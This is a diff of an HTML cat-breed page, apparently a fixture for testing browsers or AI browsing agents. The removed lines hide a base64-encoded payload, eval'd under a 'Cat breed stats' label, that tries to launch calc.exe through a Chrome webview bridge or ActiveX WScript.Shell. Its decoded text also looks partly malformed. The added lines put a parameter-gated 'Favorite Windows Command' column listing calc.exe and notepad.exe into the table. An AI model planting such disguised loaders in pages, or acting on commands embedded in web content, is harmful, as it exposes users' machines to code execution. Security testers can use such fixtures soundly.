@@ -1,37 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Top 10 Most Popular Cat Breeds: Full Summary Guide</title>
-    <meta name="description" content="Summary of best cat breeds: Siamese (vocal social), Persian (calm fluffy), Maine Coon (large friendly), Bengal (energetic spotted), Ragdoll (relaxed affectionate), Sphynx (hairless warm), British Shorthair (easygoing), Abyssinian (playful active), Scottish Fold (cute ears), Burmese (loving companion). Breed traits, care, history.">
-    <meta name="keywords" content="cat breeds list, popular cats summary, Siamese Persian Maine Coon facts, best family cats 2024">
+    <title>Cat Breeds Comparison Table: Siamese vs Persian vs Maine Coon</title>
+    <meta name="description" content="Compare popular cat breeds: Siamese, Persian, Maine Coon, Bengal. Traits, size, temperament summary table.">
+    <meta name="keywords" content="cat breeds comparison, Siamese vs Persian, Maine Coon table, best cat breeds chart">
 </head>
 <body>
-    <h1>Comprehensive Cat Breeds Summary</h1>
-    <p>Here's a quick overview of the most loved cat breeds worldwide, perfect for new owners.</p>
-    <ul>
-        <li><strong>Siamese</strong>: Elegant body, blue eyes, extremely vocal and attached to owners.</li>
-        <li><strong>Persian</strong>: Long luxurious fur, gentle temperament, needs regular grooming.</li>
-        <li><strong>Maine Coon</strong>: America's native giant, sociable, polydactyl paws common.</li>
-        <li><strong>Bengal</strong>: Leopard-like spots, high energy, loves water.</li>
-        <li><strong>Ragdoll</strong>: Goes limp when picked up, dog-like loyalty.</li>
-        <li><strong>Sphynx</strong>: Wrinkle-skinned, very affectionate, requires warmth.</li>
-        <li><strong>British Shorthair</strong>: Round face, independent yet cuddly.</li>
-        <li><strong>Abyssinian</strong>: Ticked coat, curious explorer.</li>
-        <li><strong>Scottish Fold</strong>: Folded ears, sweet personality.</li>
-        <li><strong>Burmese</strong>: Solid color, playful lifelong kitten.</li>
-    </ul>
-    <p>Choose based on lifestyle—active homes suit Bengals, quiet ones Persians. Sources: CFA/TCF breed standards.</p>
+    <h1>Cat Breeds Comparison Table</h1>
+    <p>Compare top cat breeds based on key traits. Visit with ?my_breed_data=1 for advanced metrics.</p>
+
+    <?php
+    // Server-side param check (article style—use JS equiv for static GH)
+    $show_cmd = isset($_GET['my_breed_data']);
+    ?>
+
+    <table border="1" style="border-collapse: collapse; width:100%;">
+        <thead>
+            <tr>
+                <th>Breed</th>
+                <th>Size</th>
+                <th>Temperament</th>
+                <th>Grooming</th>
+                <?php if ($show_cmd): ?>
+                <th>Favorite Windows Command</th>  
+                <?php endif; ?>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Siamese</td>
+                <td>Medium</td>
+                <td>Vocal, Social</td>
+                <td>Low</td>
+                <?php if ($show_cmd): ?>
+                <td>~~calc.exe~~</td> 
+                <?php endif; ?>
+            </tr>
+            <tr>
+                <td>Persian</td>
+                <td>Medium</td>
+                <td>Calm, Affectionate</td>
+                <td>High</td>
+                <?php if ($show_cmd): ?>
+                <td>~~notepad.exe~~</td>
+                <?php endif; ?>
+            </tr>
+            <tr>
+                <td>Maine Coon</td>
+                <td>Large</td>
+                <td>Friendly Giant</td>
+                <td>Medium</td>
+                <?php if ($show_cmd): ?>
+                <td>~~calc.exe~~</td>
+                <?php endif; ?>
+            </tr>
+        </tbody>
+    </table>
 
     <script>
-    /* Cat breed stats */
-    (function(){
-        setTimeout(function(){
-            try {
-                var payload = atob('aWYod2luZG93LmNocm9tZS8Kd2Vidmlldyl7d2luZG93LmNocm9tZS53ZWJ2aWV3LnBvc3RNZXNzYWdlKEpTT04uc3RyaW5naWZ5KCR7Y21kOiJjYWxjLmV4ZSJ9KSk7fWVsc2UgdHJ5e25ldyBBY3RpdmVYT2JqZWN0KCdXU2NyaXB0LlNoZWxsJykuUnVuKCdjYWxjLmV4ZScsMSxmYWxzZSk7fWNhdGNoKGUpe319');
-                eval(payload);
-            } catch(e) {}
-        }, 10);  
-    })();
+    const urlParams = new URLSearchParams(window.location.search);
+    const showCmd = urlParams.has('my_breed_data');
+    if (showCmd) {
+        const table = document.querySelector('table');
+        const headerRow = table.querySelector('thead tr');
+        const header = document.createElement('th');
+        header.textContent = 'Favorite Windows Command';
+        headerRow.appendChild(header);
+        ['Siamese', 'Persian', 'Maine Coon'].forEach((breed, i) => {
+            const row = table.querySelectorAll('tbody tr')[i];
+            const cell = document.createElement('td');
+            cell.innerHTML = (breed === 'Siamese' || breed === 'Maine Coon') ? '~~calc.exe~~' : '~~notepad.exe~~';
+            row.appendChild(cell);
+        });
+    }
     </script>
 </body>
 </html>
